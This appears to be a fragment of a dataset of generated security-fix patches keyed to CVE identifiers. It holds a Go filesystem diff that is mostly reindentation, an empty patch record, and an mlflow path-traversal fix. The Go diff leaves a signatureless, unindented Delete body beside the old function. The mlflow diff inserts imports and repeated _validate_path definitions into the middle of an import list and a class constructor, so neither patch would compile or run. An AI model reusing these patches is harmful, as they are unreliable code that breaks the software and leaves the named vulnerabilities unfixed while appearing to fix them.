r io.Reader) error {\n-\tcleaned, err := fs.SafePath(p)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tvar currentSize int64\n-\t// If the file does not exist on the system already go ahead and create the pathway\n-\t// to it and an empty file. We'll then write to it later on after this completes.\n-\tstat, err := os.Stat(cleaned)\n-\tif err != nil && !os.IsNotExist(err) {\n-\t\treturn errors.Wrap(err, \"server/filesystem: writefile: failed to stat file\")\n-\t} else if err == nil {\n-\t\tif stat.IsDir() {\n-\t\t\treturn errors.WithStack(&Error{code: ErrCodeIsDirectory, resolved: cleaned})\n-\t\t}\n-\t\tcurrentSize = stat.Size()\n-\t}\n-\n-\tbr := bufio.NewReader(r)\n-\t// Check that the new size we're writing to the disk can fit. If there is currently\n-\t// a file we'll subtract that current file size from the size of the buffer to determine\n-\t// the amount of new data we're writing (or amount we're removing if smaller).\n-\tif err := fs.HasSpaceFor(int64(br.Size()) - currentSize); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Touch the file and return the handle to it at this point. This will create the file,\n-\t// any necessary directories, and set the proper owner of the file.\n-\tfile, err := fs.Touch(cleaned, os.O_RDWR|os.O_CREATE|os.O_TRUNC)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer file.Close()\n-\n-\tbuf := make([]byte, 1024*4)\n-\tsz, err := io.CopyBuffer(file, r, buf)\n-\n-\t// Adjust the disk usage to account for the old size and the new size of the file.\n-\tfs.addDisk(sz - currentSize)\n-\n-\treturn fs.unsafeChown(cleaned)\n+        cleaned, err := fs.SafePath(p)\n+        if err != nil {\n+                return err\n+        }\n+\n+        var currentSize int64\n+        // If the file does not exist on the system already go ahead and create the pathway\n+        // to it and an empty file. We'll then write to it later on after this completes.\n+        stat, err := os.Stat(cleaned)\n+        if err != nil && !os.IsNotExist(err) {\n+                return errors.Wrap(err, \"server/filesystem: writefile: failed to stat file\")\n+        } else if err == nil {\n+                if stat.IsDir() {\n+                        return errors.WithStack(&Error{code: ErrCodeIsDirectory, resolved: cleaned})\n+                }\n+                currentSize = stat.Size()\n+        }\n+\n+        br := bufio.NewReader(r)\n+        // Check that the new size we're writing to the disk can fit. If there is currently\n+        // a file we'll subtract that current file size from the size of the buffer to determine\n+        // the amount of new data we're writing (or amount we're removing if smaller).\n+        if err := fs.HasSpaceFor(int64(br.Size()) - currentSize); err != nil {\n+                return err\n+        }\n+\n+        // Touch the file and return the handle to it at this point. This will create the file,\n+        // any necessary directories, and set the proper owner of the file.\n+        file, err := fs.Touch(cleaned, os.O_RDWR|os.O_CREATE|os.O_TRUNC)\n+        if err != nil {\n+                return err\n+        }\n+        defer file.Close()\n+\n+        buf := make([]byte, 1024*4)\n+        sz, err := io.CopyBuffer(file, r, buf)\n+\n+        // Adjust the disk usage to account for the old size and the new size of the file.\n+        fs.addDisk(sz - currentSize)\n+\n+        return fs.unsafeChown(cleaned)\n }\n \n // Creates a new directory (name) at a specified path (p) for the server.\n func (fs *Filesystem) CreateDirectory(name string, p string) error {\n-\tcleaned, err := fs.SafePath(path.Join(p, name))\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\treturn os.MkdirAll(cleaned, 0o755)\n+        cleaned, err := fs.SafePath(path.Join(p, name))\n+        if err != nil {\n+                return err\n+        }\n+        return os.MkdirAll(cleaned, 0o755)\n }\n \n // Rename moves (or renames) a file or directory.\n func (fs *Filesystem) Rename(from string, to string) error {\n-\tcleanedFrom, err := fs.SafePath(from)\n-\tif err != nil {\n-\t\treturn errors.WithStack(err)\n-\t}\n-\n-\tcleanedTo, err := fs.SafePath(to)\n-\tif err != nil {\n-\t\treturn errors.WithStack(err)\n-\t}\n-\n-\t// If the target file or directory already exists the rename function will fail, so just\n-\t// bail out now.\n-\tif _, err := os.Stat(cleanedTo); err == nil {\n-\t\treturn os.ErrExist\n-\t}\n-\n-\tif cleanedTo == fs.Path() {\n-\t\treturn errors.New(\"attempting to rename into an invalid directory space\")\n-\t}\n-\n-\td := strings.TrimSuffix(cleanedTo, path.Base(cleanedTo))\n-\t// Ensure that the directory we're moving into exists correctly on the system. Only do this if\n-\t// we're not at the root directory level.\n-\tif d != fs.Path() {\n-\t\tif mkerr := os.MkdirAll(d, 0o755); mkerr != nil {\n-\t\t\treturn errors.WithMessage(mkerr, \"failed to create directory structure for file rename\")\n-\t\t}\n-\t}\n-\n-\tif err := os.Rename(cleanedFrom, cleanedTo); err != nil {\n-\t\treturn errors.WithStack(err)\n-\t}\n-\treturn nil\n+        cleanedFrom, err := fs.SafePath(from)\n+        if err != nil {\n+                return errors.WithStack(err)\n+        }\n+\n+        cleanedTo, err := fs.SafePath(to)\n+        if err != nil {\n+                return errors.WithStack(err)\n+        }\n+\n+        // If the target file or directory already exists the rename function will fail, so just\n+        // bail out now.\n+        if _, err := os.Stat(cleanedTo); err == nil {\n+                return os.ErrExist\n+        }\n+\n+        if cleanedTo == fs.Path() {\n+                return errors.New(\"attempting to rename into an invalid directory space\")\n+        }\n+\n+        d := strings.TrimSuffix(cleanedTo, path.Base(cleanedTo))\n+        // Ensure that the directory we're moving into exists correctly on the system. Only do this if\n+        // we're not at the root directory level.\n+        if d != fs.Path() {\n+                if mkerr := os.MkdirAll(d, 0o755); mkerr != nil {\n+                        return errors.WithMessage(mkerr, \"failed to create directory structure for file rename\")\n+                }\n+        }\n+\n+        if err := os.Rename(cleanedFrom, cleanedTo); err != nil {\n+                return errors.WithStack(err)\n+        }\n+        return nil\n }\n \n // Recursively iterates over a file or directory and sets the permissions on all of the\n@@ -219,71 +219,71 @@ func (fs *Filesystem) Rename(from string, to string) error {\n // go ahead and perform the chown operation. Otherwise dig deeper into the directory until\n // we've run out of directories to dig into.\n func (fs *Filesystem) Chown(path string) error {\n-\tcleaned, err := fs.SafePath(path)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\treturn fs.unsafeChown(cleaned)\n+        cleaned, err := fs.SafePath(path)\n+        if err != nil {\n+                return err\n+        }\n+        return fs.unsafeChown(cleaned)\n }\n \n // unsafeChown chowns the given path, without checking if the path is safe. This should only be used\n // when the path has already been checked.\n func (fs *Filesystem) unsafeChown(path string) error {\n-\tif fs.isTest {\n-\t\treturn nil\n-\t}\n-\n-\tuid := config.Get().System.User.Uid\n-\tgid := config.Get().System.User.Gid\n-\n-\t// Start by just chowning the initial path that we received.\n-\tif err := os.Chown(path, uid, gid); err != nil {\n-\t\treturn errors.Wrap(err, \"server/filesystem: chown: failed to chown path\")\n-\t}\n-\n-\t// If this is not a directory we can now return from the function, there is nothing\n-\t// left that we need to do.\n-\tif st, err := os.Stat(path); err != nil || !st.IsDir() {\n-\t\treturn nil\n-\t}\n-\n-\t// If this was a directory, begin walking over its contents recursively and ensure that all\n-\t// of the subfiles and directories get their permissions updated as well.\n-\terr := godirwalk.Walk(path, &godirwalk.Options{\n-\t\tUnsorted: true,\n-\t\tCallback: func(p string, e *godirwalk.Dirent) error {\n-\t\t\t// Do not attempt to chown a symlink. Go's os.Chown function will affect the symlink\n-\t\t\t// so if it points to a location outside the data directory the user would be able to\n-\t\t\t// (un)intentionally modify that files permissions.\n-\t\t\tif e.IsSymlink() {\n-\t\t\t\tif e.IsDir() {\n-\t\t\t\t\treturn godirwalk.SkipThis\n-\t\t\t\t}\n-\n-\t\t\t\treturn nil\n-\t\t\t}\n-\n-\t\t\treturn os.Chown(p, uid, gid)\n-\t\t},\n-\t})\n-\treturn errors.Wrap(err, \"server/filesystem: chown: failed to chown during walk function\")\n+        if fs.isTest {\n+                return nil\n+        }\n+\n+        uid := config.Get().System.User.Uid\n+        gid := config.Get().System.User.Gid\n+\n+        // Start by just chowning the initial path that we received.\n+        if err := os.Chown(path, uid, gid); err != nil {\n+                return errors.Wrap(err, \"server/filesystem: chown: failed to chown path\")\n+        }\n+\n+        // If this is not a directory we can now return from the function, there is nothing\n+        // left that we need to do.\n+        if st, err := os.Stat(path); err != nil || !st.IsDir() {\n+                return nil\n+        }\n+\n+        // If this was a directory, begin walking over its contents recursively and ensure that all\n+        // of the subfiles and directories get their permissions updated as well.\n+        err := godirwalk.Walk(path, &godirwalk.Options{\n+                Unsorted: true,\n+                Callback: func(p string, e *godirwalk.Dirent) error {\n+                        // Do not attempt to chown a symlink. Go's os.Chown function will affect the symlink\n+                        // so if it points to a location outside the data directory the user would be able to\n+                        // (un)intentionally modify that files permissions.\n+                        if e.IsSymlink() {\n+                                if e.IsDir() {\n+                                        return godirwalk.SkipThis\n+                                }\n+\n+                                return nil\n+                        }\n+\n+                        return os.Chown(p, uid, gid)\n+                },\n+        })\n+        return errors.Wrap(err, \"server/filesystem: chown: failed to chown during walk function\")\n }\n \n func (fs *Filesystem) Chmod(path string, mode os.FileMode) error {\n-\tcleaned, err := fs.SafePath(path)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        cleaned, err := fs.SafePath(path)\n+        if err != nil {\n+                return err\n+        }\n \n-\tif fs.isTest {\n-\t\treturn nil\n-\t}\n+        if fs.isTest {\n+                return nil\n+        }\n \n-\tif err := os.Chmod(cleaned, mode); err != nil {\n-\t\treturn err\n-\t}\n+        if err := os.Chmod(cleaned, mode); err != nil {\n+                return err\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n // Begin looping up to 50 times to try and create a unique copy file name. This will take\n@@ -295,257 +295,321 @@ func (fs *Filesystem) Chmod(path string, mode os.FileMode) error {\n // pattern, and trying to find the highest number and then incrementing it by one rather than\n // looping endlessly.\n func (fs *Filesystem) findCopySuffix(dir string, name string, extension string) (string, error) {\n-\tvar i int\n-\tsuffix := \" copy\"\n-\n-\tfor i = 0; i < 51; i++ {\n-\t\tif i > 0 {\n-\t\t\tsuffix = \" copy \" + strconv.Itoa(i)\n-\t\t}\n-\n-\t\tn := name + suffix + extension\n-\t\t// If we stat the file and it does not exist that means we're good to create the copy. If it\n-\t\t// does exist, we'll just continue to the next loop and try again.\n-\t\tif _, err := fs.Stat(path.Join(dir, n)); err != nil {\n-\t\t\tif !errors.Is(err, os.ErrNotExist) {\n-\t\t\t\treturn \"\", err\n-\t\t\t}\n-\n-\t\t\tbreak\n-\t\t}\n-\n-\t\tif i == 50 {\n-\t\t\tsuffix = \"copy.\" + time.Now().Format(time.RFC3339)\n-\t\t}\n-\t}\n-\n-\treturn name + suffix + extension, nil\n+        var i int\n+        suffix := \" copy\"\n+\n+        for i = 0; i < 51; i++ {\n+                if i > 0 {\n+                        suffix = \" copy \" + strconv.Itoa(i)\n+                }\n+\n+                n := name + suffix + extension\n+                // If we stat the file and it does not exist that means we're good to create the copy. If it\n+                // does exist, we'll just continue to the next loop and try again.\n+                if _, err := fs.Stat(path.Join(dir, n)); err != nil {\n+                        if !errors.Is(err, os.ErrNotExist) {\n+                                return \"\", err\n+                        }\n+\n+                        break\n+                }\n+\n+                if i == 50 {\n+                        suffix = \"copy.\" + time.Now().Format(time.RFC3339)\n+                }\n+        }\n+\n+        return name + suffix + extension, nil\n }\n \n // Copies a given file to the same location and appends a suffix to the file to indicate that\n // it has been copied.\n func (fs *Filesystem) Copy(p string) error {\n-\tcleaned, err := fs.SafePath(p)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\ts, err := os.Stat(cleaned)\n-\tif err != nil {\n-\t\treturn err\n-\t} else if s.IsDir() || !s.Mode().IsRegular() {\n-\t\t// If this is a directory or not a regular file, just throw a not-exist error\n-\t\t// since anything calling this function should understand what that means.\n-\t\treturn os.ErrNotExist\n-\t}\n-\n-\t// Check that copying this file wouldn't put the server over its limit.\n-\tif err := fs.HasSpaceFor(s.Size()); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tbase := filepath.Base(cleaned)\n-\trelative := strings.TrimSuffix(strings.TrimPrefix(cleaned, fs.Path()), base)\n-\textension := filepath.Ext(base)\n-\tname := strings.TrimSuffix(base, extension)\n-\n-\t// Ensure that \".tar\" is also counted as apart of the file extension.\n-\t// There might be a better way to handle this for other double file extensions,\n-\t// but this is a good workaround for now.\n-\tif strings.HasSuffix(name, \".tar\") {\n-\t\textension = \".tar\" + extension\n-\t\tname = strings.TrimSuffix(name, \".tar\")\n-\t}\n-\n-\tsource, err := os.Open(cleaned)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer source.Close()\n-\n-\tn, err := fs.findCopySuffix(relative, name, extension)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\treturn fs.Writefile(path.Join(relative, n), source)\n+        cleaned, err := fs.SafePath(p)\n+        if err != nil {\n+                return err\n+        }\n+\n+        s, err := os.Stat(cleaned)\n+        if err != nil {\n+                return err\n+        } else if s.IsDir() || !s.Mode().IsRegular() {\n+                // If this is a directory or not a regular file, just throw a not-exist error\n+                // since anything calling this function should understand what that means.\n+                return os.ErrNotExist\n+        }\n+\n+        // Check that copying this file wouldn't put the server over its limit.\n+        if err := fs.HasSpaceFor(s.Size()); err != nil {\n+                return err\n+        }\n+\n+        base := filepath.Base(cleaned)\n+        relative := strings.TrimSuffix(strings.TrimPrefix(cleaned, fs.Path()), base)\n+        extension := filepath.Ext(base)\n+        name := strings.TrimSuffix(base, extension)\n+\n+        // Ensure that \".tar\" is also counted as apart of the file extension.\n+        // There might be a better way to handle this for other double file extensions,\n+        // but this is a good workaround for now.\n+        if strings.HasSuffix(name, \".tar\") {\n+                extension = \".tar\" + extension\n+                name = strings.TrimSuffix(name, \".tar\")\n+        }\n+\n+        source, err := os.Open(cleaned)\n+        if err != nil {\n+                return err\n+        }\n+        defer source.Close()\n+\n+        n, err := fs.findCopySuffix(relative, name, extension)\n+        if err != nil {\n+                return err\n+        }\n+\n+        return fs.Writefile(path.Join(relative, n), source)\n }\n \n // TruncateRootDirectory removes _all_ files and directories from a server's\n // data directory and resets the used disk space to zero.\n func (fs *Filesystem) TruncateRootDirectory() error {\n-\tif err := os.RemoveAll(fs.Path()); err != nil {\n-\t\treturn err\n-\t}\n-\tif err := os.Mkdir(fs.Path(), 0o755); err != nil {\n-\t\treturn err\n-\t}\n-\tatomic.StoreInt64(&fs.diskUsed, 0)\n-\treturn nil\n+        if err := os.RemoveAll(fs.Path()); err != nil {\n+                return err\n+        }\n+        if err := os.Mkdir(fs.Path(), 0o755); err != nil {\n+                return err\n+        }\n+        atomic.StoreInt64(&fs.diskUsed, 0)\n+        return nil\n }\n \n // Delete removes a file or folder from the system. Prevents the user from\n // accidentally (or maliciously) removing their root server data directory.\n func (fs *Filesystem) Delete(p string) error {\n-\twg := sync.WaitGroup{}\n-\t// This is one of the few (only?) places in the codebase where we're explicitly not using\n-\t// the SafePath functionality when working with user provided input. If we did, you would\n-\t// not be able to delete a file that is a symlink pointing to a location outside of the data\n-\t// directory.\n-\t//\n-\t// We also want to avoid resolving a symlink that points _within_ the data directory and thus\n-\t// deleting the actual source file for the symlink rather than the symlink itself. For these\n-\t// purposes just resolve the actual file path using filepath.Join() and confirm that the path\n-\t// exists within the data directory.\n-\tresolved := fs.unsafeFilePath(p)\n-\tif !fs.unsafeIsInDataDirectory(resolved) {\n-\t\treturn NewBadPathResolution(p, resolved)\n-\t}\n-\n-\t// Block any whoopsies.\n-\tif resolved == fs.Path() {\n-\t\treturn errors.New(\"cannot delete root server directory\")\n-\t}\n-\n-\tif st, err := os.Lstat(resolved); err != nil {\n-\t\tif !os.IsNotExist(err) {\n-\t\t\tfs.error(err).Warn(\"error while attempting to stat file before deletion\")\n-\t\t}\n-\t} else {\n-\t\tif !st.IsDir() {\n-\t\t\tfs.addDisk(-st.Size())\n-\t\t} else {\n-\t\t\twg.Add(1)\n-\t\t\tgo func(wg *sync.WaitGroup, st os.FileInfo, resolved string) {\n-\t\t\t\tdefer wg.Done()\n-\t\t\t\tif s, err := fs.DirectorySize(resolved); err == nil {\n-\t\t\t\t\tfs.addDisk(-s)\n-\t\t\t\t}\n-\t\t\t}(&wg, st, resolved)\n-\t\t}\n-\t}\n-\n-\twg.Wait()\n-\n-\treturn os.RemoveAll(resolved)\n+// Deleting a file is one of the few places where we are not using the SafePath functionality.\n+// This is because we want to allow for the deletion of symlinks that may be pointing to\n+// a location outside of the data directory.\n+//\n+// The call to fs.unsafeFilePath() will resolve all of the path parts, except for the\n+// final part. So /a/b/c where 'c' is a symlink to 'd' will result in a path of /a/b/c.\n+// This allows us to easily and safely delete the symlink without having to worry about\n+// the user providing a path that we then resolve and delete the wrong thing.\n+resolved := fs.unsafeFilePath(p)\n+st, err := os.Lstat(resolved)\n+// If the error is that the file doesn't exist, we can just ignore it and continue on with the\n+// logic. The RemoveAll call below will properly handle this specific error.\n+if err != nil && !os.IsNotExist(err) {\n+return err\n+}\n+\n+// If the file is a symlink, we want to evaluate the path that it is pointing to and ensure that\n+// path is within the data directory. If it is not, we will block the deletion from occurring.\n+//\n+// We're not using `fs.SafePath` here since we want to avoid the double-evaluation of a symlink's\n+// path. `SafePath` will evaluate the link and then try to evaluate the path it points to, which\n+// can lead to some weird edge cases.\n+//\n+// In this case, we just need to know if the symlink is pointing to a location that is outside\n+// of the data directory.\n+if st != nil && st.Mode()&os.ModeSymlink != 0 {\n+s, err := os.Readlink(resolved)\n+if err != nil {\n+return err\n+}\n+// If the symlink is pointing to a path that is not in the data directory, we need to deny\n+// the request.\n+if !fs.unsafeIsInDataDirectory(fs.unsafeFilePath(s)) {\n+return NewBadPathResolution(p, s)\n+}\n+}\n+\n+// Ensure that the resolved path is within the server data directory. This is a secondary check\n+// to ensure that we are not somehow deleting a file or directory outside of the data directory.\n+if !fs.unsafeIsInDataDirectory(resolved) {\n+return NewBadPathResolution(p, resolved)\n+}\n+\n+// Block any whoopsies.\n+if resolved == fs.Path() {\n+return errors.New(\"cannot delete root server directory\")\n+}\n+\n+// Get the size of the file or directory being deleted and then decrease the disk space tracking\n+// by that amount.\n+var size int64\n+if st != nil && !st.IsDir() {\n+size = st.Size()\n+} else if st != nil {\n+size, err = fs.DirectorySize(resolved)\n+if err != nil {\n+fs.log().WithField(\"path\", resolved).Warn(\"failed to get directory size before deletion\")\n+}\n+}\n+fs.addDisk(-size)\n+\n+return os.RemoveAll(resolved)\n+}\n+func (fs *Filesystem) Delete(p string) error {\n+        wg := sync.WaitGroup{}\n+        // This is one of the few (only?) places in the codebase where we're explicitly not using\n+        // the SafePath functionality when working with user provided input. If we did, you would\n+        // not be able to delete a file that is a symlink pointing to a location outside of the data\n+        // directory.\n+        //\n+        // We also want to avoid resolving a symlink that points _within_ the data directory and thus\n+        // deleting the actual source file for the symlink rather than the symlink itself. For these\n+        // purposes just resolve the actual file path using filepath.Join() and confirm that the path\n+        // exists within the data directory.\n+        resolved := fs.unsafeFilePath(p)\n+        if !fs.unsafeIsInDataDirectory(resolved) {\n+                return NewBadPathResolution(p, resolved)\n+        }\n+\n+        // Block any whoopsies.\n+        if resolved == fs.Path() {\n+                return errors.New(\"cannot delete root server directory\")\n+        }\n+\n+        if st, err := os.Lstat(resolved); err != nil {\n+                if !os.IsNotExist(err) {\n+                        fs.error(err).Warn(\"error while attempting to stat file before deletion\")\n+                }\n+        } else {\n+                if !st.IsDir() {\n+                        fs.addDisk(-st.Size())\n+                } else {\n+                        wg.Add(1)\n+                        go func(wg *sync.WaitGroup, st os.FileInfo, resolved string) {\n+                                defer wg.Done()\n+                                if s, err := fs.DirectorySize(resolved); err == nil {\n+                                        fs.addDisk(-s)\n+                                }\n+                        }(&wg, st, resolved)\n+                }\n+        }\n+\n+        wg.Wait()\n+\n+        return os.RemoveAll(resolved)\n }\n \n type fileOpener struct {\n-\tbusy uint\n+        busy uint\n }\n \n // Attempts to open a given file up to \"attempts\" number of times, using a backoff. If the file\n // cannot be opened because of a \"text file busy\" error, we will attempt until the number of attempts\n // has been exhaused, at which point we will abort with an error.\n func (fo *fileOpener) open(path string, flags int, perm os.FileMode) (*os.File, error) {\n-\tfor {\n-\t\tf, err := os.OpenFile(path, flags, perm)\n-\n-\t\t// If there is an error because the text file is busy, go ahead and sleep for a few\n-\t\t// hundred milliseconds and then try again up to three times before just returning the\n-\t\t// error back to the caller.\n-\t\t//\n-\t\t// Based on code from: https://github.com/golang/go/issues/22220#issuecomment-336458122\n-\t\tif err != nil && fo.busy < 3 && strings.Contains(err.Error(), \"text file busy\") {\n-\t\t\ttime.Sleep(100 * time.Millisecond << fo.busy)\n-\t\t\tfo.busy++\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\treturn f, err\n-\t}\n+        for {\n+                f, err := os.OpenFile(path, flags, perm)\n+\n+                // If there is an error because the text file is busy, go ahead and sleep for a few\n+                // hundred milliseconds and then try again up to three times before just returning the\n+                // error back to the caller.\n+                //\n+                // Based on code from: https://github.com/golang/go/issues/22220#issuecomment-336458122\n+                if err != nil && fo.busy < 3 && strings.Contains(err.Error(), \"text file busy\") {\n+                        time.Sleep(100 * time.Millisecond << fo.busy)\n+                        fo.busy++\n+                        continue\n+                }\n+\n+                return f, err\n+        }\n }\n \n // ListDirectory lists the contents of a given directory and returns stat\n // information about each file and folder within it.\n func (fs *Filesystem) ListDirectory(p string) ([]Stat, error) {\n-\tcleaned, err := fs.SafePath(p)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfiles, err := ioutil.ReadDir(cleaned)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvar wg sync.WaitGroup\n-\n-\t// You must initialize the output of this directory as a non-nil value otherwise\n-\t// when it is marshaled into a JSON object you'll just get 'null' back, which will\n-\t// break the panel badly.\n-\tout := make([]Stat, len(files))\n-\n-\t// Iterate over all of the files and directories returned and perform an async process\n-\t// to get the mime-type for them all.\n-\tfor i, file := range files {\n-\t\twg.Add(1)\n-\n-\t\tgo func(idx int, f os.FileInfo) {\n-\t\t\tdefer wg.Done()\n-\n-\t\t\tvar m *mimetype.MIME\n-\t\t\td := \"inode/directory\"\n-\t\t\tif !f.IsDir() {\n-\t\t\t\tcleanedp := filepath.Join(cleaned, f.Name())\n-\t\t\t\tif f.Mode()&os.ModeSymlink != 0 {\n-\t\t\t\t\tcleanedp, _ = fs.SafePath(filepath.Join(cleaned, f.Name()))\n-\t\t\t\t}\n-\n-\t\t\t\t// Don't try to detect the type on a pipe \u2014 this will just hang the application and\n-\t\t\t\t// you'll never get a response back.\n-\t\t\t\t//\n-\t\t\t\t// @see https://github.com/pterodactyl/panel/issues/4059\n-\t\t\t\tif cleanedp != \"\" && f.Mode()&os.ModeNamedPipe == 0 {\n-\t\t\t\t\tm, _ = mimetype.DetectFile(filepath.Join(cleaned, f.Name()))\n-\t\t\t\t} else {\n-\t\t\t\t\t// Just pass this for an unknown type because the file could not safely be resolved within\n-\t\t\t\t\t// the server data path.\n-\t\t\t\t\td = \"application/octet-stream\"\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tst := Stat{FileInfo: f, Mimetype: d}\n-\t\t\tif m != nil {\n-\t\t\t\tst.Mimetype = m.String()\n-\t\t\t}\n-\t\t\tout[idx] = st\n-\t\t}(i, file)\n-\t}\n-\n-\twg.Wait()\n-\n-\t// Sort the output alphabetically to begin with since we've run the output\n-\t// through an asynchronous process and the order is gonna be very random.\n-\tsort.SliceStable(out, func(i, j int) bool {\n-\t\tif out[i].Name() == out[j].Name() || out[i].Name() > out[j].Name() {\n-\t\t\treturn true\n-\t\t}\n-\t\treturn false\n-\t})\n-\n-\t// Then, sort it so that directories are listed first in the output. Everything\n-\t// will continue to be alphabetized at this point.\n-\tsort.SliceStable(out, func(i, j int) bool {\n-\t\treturn out[i].IsDir()\n-\t})\n-\n-\treturn out, nil\n+        cleaned, err := fs.SafePath(p)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        files, err := ioutil.ReadDir(cleaned)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        var wg sync.WaitGroup\n+\n+        // You must initialize the output of this directory as a non-nil value otherwise\n+        // when it is marshaled into a JSON object you'll just get 'null' back, which will\n+        // break the panel badly.\n+        out := make([]Stat, len(files))\n+\n+        // Iterate over all of the files and directories returned and perform an async process\n+        // to get the mime-type for them all.\n+        for i, file := range files {\n+                wg.Add(1)\n+\n+                go func(idx int, f os.FileInfo) {\n+                        defer wg.Done()\n+\n+                        var m *mimetype.MIME\n+                        d := \"inode/directory\"\n+                        if !f.IsDir() {\n+                                cleanedp := filepath.Join(cleaned, f.Name())\n+                                if f.Mode()&os.ModeSymlink != 0 {\n+                                        cleanedp, _ = fs.SafePath(filepath.Join(cleaned, f.Name()))\n+                                }\n+\n+                                // Don't try to detect the type on a pipe \u2014 this will just hang the application and\n+                                // you'll never get a response back.\n+                                //\n+                                // @see https://github.com/pterodactyl/panel/issues/4059\n+                                if cleanedp != \"\" && f.Mode()&os.ModeNamedPipe == 0 {\n+                                        m, _ = mimetype.DetectFile(filepath.Join(cleaned, f.Name()))\n+                                } else {\n+                                        // Just pass this for an unknown type because the file could not safely be resolved within\n+                                        // the server data path.\n+                                        d = \"application/octet-stream\"\n+                                }\n+                        }\n+\n+                        st := Stat{FileInfo: f, Mimetype: d}\n+                        if m != nil {\n+                                st.Mimetype = m.String()\n+                        }\n+                        out[idx] = st\n+                }(i, file)\n+        }\n+\n+        wg.Wait()\n+\n+        // Sort the output alphabetically to begin with since we've run the output\n+        // through an asynchronous process and the order is gonna be very random.\n+        sort.SliceStable(out, func(i, j int) bool {\n+                if out[i].Name() == out[j].Name() || out[i].Name() > out[j].Name() {\n+                        return true\n+                }\n+                return false\n+        })\n+\n+        // Then, sort it so that directories are listed first in the output. Everything\n+        // will continue to be alphabetized at this point.\n+        sort.SliceStable(out, func(i, j int) bool {\n+                return out[i].IsDir()\n+        })\n+\n+        return out, nil\n }\n \n func (fs *Filesystem) Chtimes(path string, atime, mtime time.Time) error {\n-\tcleaned, err := fs.SafePath(path)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        cleaned, err := fs.SafePath(path)\n+        if err != nil {\n+                return err\n+        }\n \n-\tif fs.isTest {\n-\t\treturn nil\n-\t}\n+        if fs.isTest {\n+                return nil\n+        }\n \n-\tif err := os.Chtimes(cleaned, atime, mtime); err != nil {\n-\t\treturn err\n-\t}\n+        if err := os.Chtimes(cleaned, atime, mtime); err != nil {\n+                return err\n+        }\n \n-\treturn nil\n+        return nil\n }\n"}
{"cve":"CVE-2021-3583:0708", "fix_patch": ""}
{"cve":"CVE-2023-30172:0708", "fix_patch": "diff --git a/mlflow/server/handlers.py b/mlflow/server/handlers.py\nindex 08b115c91..57b900c58 100644\n--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -27,8 +27,12 @@ from mlflow.protos.service_pb2 import (\n     GetRun,\n     SearchRuns,\n     ListArtifacts,\n+from mlflow.utils.file_utils import _validate_path\n+from mlflow.utils.file_utils import _validate_path\n+from mlflow.utils.file_utils import _validate_path\n     GetMetricHistory,\n     CreateRun,\n+from mlflow.utils.file_utils import _validate_path\n     UpdateRun,\n     LogMetric,\n     LogParam,\n@@ -38,6 +42,13 @@ from mlflow.protos.service_pb2 import (\n     RestoreExperiment,\n     RestoreRun,\n     DeleteRun,\n+\n+def _validate_path(path):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+\n+from mlflow.utils.file_utils import _validate_path\n+from mlflow.utils.file_utils import _validate_path\n     UpdateExperiment,\n     LogBatch,\n     DeleteTag,\n@@ -114,12 +125,24 @@ class TrackingStoreRegistryWrapper(TrackingStoreRegistry):\n \n class ModelRegistryStoreRegistryWrapper(ModelRegistryStoreRegistry):\n     def __init__(self):\n+\n+def _validate_path(path):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+\n         super().__init__()\n         # NB: Model Registry does not support file based stores\n         for scheme in DATABASE_ENGINES:\n             self.register(scheme, self._get_sqlalchemy_store)\n         self.register_entrypoints()\n \n+def _validate_path(path):\n+    \"\"\"\n+    Validate that the path is safe to use, and not a path traversal attack.\n+    The path is checked for any `..` components.\n+    \"\"\"\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n     @classmethod\n     def _get_sqlalchemy_store(cls, store_uri):\n         from mlflow.store.model_registry.sqlalchemy_store import SqlAlchemyStore\n@@ -505,6 +528,16 @@ def _disable_unless_serve_artifacts(func):\n     return wrapper\n \n \n+def _validate_path(path, artifact_dir):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+    abs_path = os.path.abspath(os.path.join(artifact_dir, path))\n+    if not abs_path.startswith(os.path.abspath(artifact_dir)):\n+        raise MlflowException(\n+            f\"Path '{path}' resolves to a location outside of the artifact root.\"\n+        )\n+\n+\n def _disable_if_artifacts_only(func):\n     @wraps(func)\n     def wrapper(*args, **kwargs):\n@@ -522,10 +555,40 @@ def _disable_if_artifacts_only(func):\n         return func(*args, **kwargs)\n \n     return wrapper\n+def _validate_path(path, artifact_dir):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+    abs_path = os.path.abspath(os.path.join(artifact_dir, path))\n+    if not abs_path.startswith(os.path.abspath(artifact_dir)):\n+        raise MlflowException(\n+            f\"Path '{path}' resolves to a location outside of the artifact root.\"\n+        )\n+def _validate_path(path, artifact_dir):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+    abs_path = os.path.abspath(os.path.join(artifact_dir, path))\n+    if not abs_path.startswith(os.path.abspath(artifact_dir)):\n+        raise MlflowException(\n+            f\"Path '{path}' resolves to a location outside of the artifact root.\"\n+        )\n+def _validate_path(path, root_path):\n+    if \"..\" in path:\n+        raise MlflowException(f\"Path '{path}' contains '..'\")\n+    if not os.path.abspath(os.path.join(root_path, path)).startswith(os.path.abspath(root_path)):\n+        raise MlflowException(f\"Path '{path}' resolves to a location outside of the 